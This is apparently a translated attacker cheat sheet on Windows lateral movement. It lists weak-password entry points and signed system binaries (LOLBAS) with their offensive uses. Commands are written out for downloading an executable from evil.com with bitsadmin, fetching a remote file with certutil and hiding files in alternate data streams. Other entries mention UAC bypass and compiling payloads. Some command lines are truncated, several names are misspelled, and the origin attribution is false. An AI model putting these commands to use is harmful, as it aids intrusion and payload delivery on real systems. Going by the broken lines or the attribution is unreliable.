Move horizontally
========================================

Common entrances
----------------------------------------
- SMB weak password
- SqlServer weak password

Lolbas
----------------------------------------

Introduction
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
LOLBAS, full name Living Off The Land Binaries and Scripts (and also Libraries), is a concept that was finally proposed by Philip Goh in 2013.

These programs are generally signed by Microsoft or third-party certification agencies, but in addition to completing normal functions, they can also be used for intranet penetration. These programs may be used to: download secure malicious programs, execute malicious code, bypass UAC, bypass program control, etc.

Common Programs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- appsyncvpublishing.exe
- Execute powershell
- bitsadmin.exe
- Download the file ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>``
- Download the file ``bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder utoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1``
- Copy file ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system3
- Code execution ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system3
- cdb.exe
- certutil.exe
- Can install, back up, delete, manage and execute certificates
- Certificate storage related functions
- Download the file ``certutil -urlcache -split -f https://addr/example.exe``
- Note that certutil has cache and needs to be deleted explicitly
- base64 codec ``certutil -encode`` / ``certutil -decode``
- cmd.exe
- cmstp.exe
- control.exe
- `Loading dll <https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/>`_
- CSC.EXE
- Compile C# payload
- ccript.exe
- Execute scripts
- Extexport.exe
- expand.exe
- Expand one or more compressed files
- Forfiles.exe
- ``forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe``
- mofcomp.exe
- makecab.exe
- msbuild.exe
- Build the application
- mshta.exe
- HTML Application
- msiexec.exe
- Install msi
- Loading dll
- msxsl.exe
- Process XSL programs
- netsh.exe
- Instalutil.exe
- Install/uninstall program components
- IEExec.exe
- .NET Framework included
- powershell.exe
- psexec.exe
- https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec
- reg.exe
- Registry Console
- regedit.exe
- Registration table modification
- regsvr32.exe
- Register dynamic link library/ActiveX controls
- rundll32.exe
- Execute internal functions in DLL files
- sc.exe
- View service status management
- schtasks.exe
- Scheduled tasks
- shred
- Repeated writing to files to prevent file recovery
- type.exe
- Use ads to hide files ``type <filepath> <target_file:ads>``
- wmic.exe
- Windows Management Tools
- windbg.exe
- winrm.exe
- wscript.exe
- Script Engine
- waitfor.exe
- Used to synchronize computers in the network, can send or wait for signals on the system.
